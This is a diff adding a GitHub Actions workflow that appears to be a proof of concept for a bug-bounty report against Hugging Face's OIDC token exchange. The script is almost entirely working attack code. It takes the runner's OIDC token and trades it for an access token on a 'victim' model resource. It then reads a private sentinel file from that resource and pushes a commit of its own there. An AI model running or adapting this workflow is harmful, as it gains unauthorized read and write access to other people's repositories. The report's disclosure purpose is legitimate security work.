@@ -1,0 +1,54 @@
+name: TP Promotion Canary
+on:
+  workflow_dispatch:
+    inputs:
+      resource:
+        description: Victim HF model resource
+        required: true
+        type: string
+      marker:
+        description: Non-secret canary marker
+        required: true
+        type: string
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  canary:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exchange OIDC and write canary
+        env:
+          RESOURCE: ${{ inputs.resource }}
+          MARKER: ${{ inputs.marker }}
+        run: |
+          set -euo pipefail
+          oidc_response="$(curl -fsS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fhuggingface.co")"
+          OIDC_TOKEN="$(jq -er .value <<<"$oidc_response")"
+          echo "::add-mask::$OIDC_TOKEN"
+          export OIDC_TOKEN
+          python - <<'PY'
+          import base64, json, os
+          part = os.environ["OIDC_TOKEN"].split(".")[1]
+          part += "=" * (-len(part) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(part))
+          keys = ["repository","repository_id","repository_owner","repository_owner_id","sub","ref","workflow_ref","job_workflow_ref","actor","actor_id"]
+          print("OIDC_CLAIMS=" + json.dumps({k: claims.get(k) for k in keys}, sort_keys=True))
+          PY
+          exchange_payload="$(jq -cn --arg s "$OIDC_TOKEN" --arg r "$RESOURCE" '{grant_type:"urn:ietf:params:oauth:grant-type:token-exchange",subject_token_type:"urn:ietf:params:oauth:token-type:id_token",subject_token:$s,resource:$r}')"
+          status="$(curl -sS -o /tmp/exchange.json -w '%{http_code}' -X POST https://huggingface.co/oauth/token -H 'Content-Type: application/json' --data "$exchange_payload")"
+          echo "HF_EXCHANGE_STATUS=$status"
+          if [ "$status" != "200" ]; then cat /tmp/exchange.json; exit 1; fi
+          HF_TOKEN="$(jq -er .access_token /tmp/exchange.json)"
+          echo "::add-mask::$HF_TOKEN"
+          jq -c '{token_type,expires_in,issued_token_type}' /tmp/exchange.json | sed 's/^/HF_EXCHANGE=/'
+          sentinel="/tmp/sentinel"
+          curl -fsS "https://huggingface.co/${RESOURCE}/resolve/main/PRIVATE_VICTIM_SENTINEL.txt" -H "Authorization: Bearer $HF_TOKEN" -o "$sentinel"
+          sha256sum "$sentinel" | awk '{print "HF_PRIVATE_READ_SHA256=" $1}'
+          rm -f "$sentinel"
+          marker_b64="$(printf '%s\n' "$MARKER" | base64 -w0)"
+          header="$(jq -cn --arg s "Promotion canary: $MARKER" '{key:"header",value:{summary:$s,description:"Owned H1 promotion canary"}}')"
+          file="$(jq -cn --arg c "$marker_b64" '{key:"file",value:{content:$c,path:"PROMOTION_CANARY.txt",encoding:"base64"}}')"
+          printf '%s\n%s\n' "$header" "$file" > /tmp/commit.ndjson
+          commit_response="$(curl -fsS -X POST "https://huggingface.co/api/models/${RESOURCE}/commit/main" -H "Authorization: Bearer $HF_TOKEN" -H 'Content-Type: application/x-ndjson' --data-binary @/tmp/commit.ndjson)"
+          jq -c '{success,commitOid,commitUrl}' <<<"$commit_response" | sed 's/^/HF_COMMIT=/'
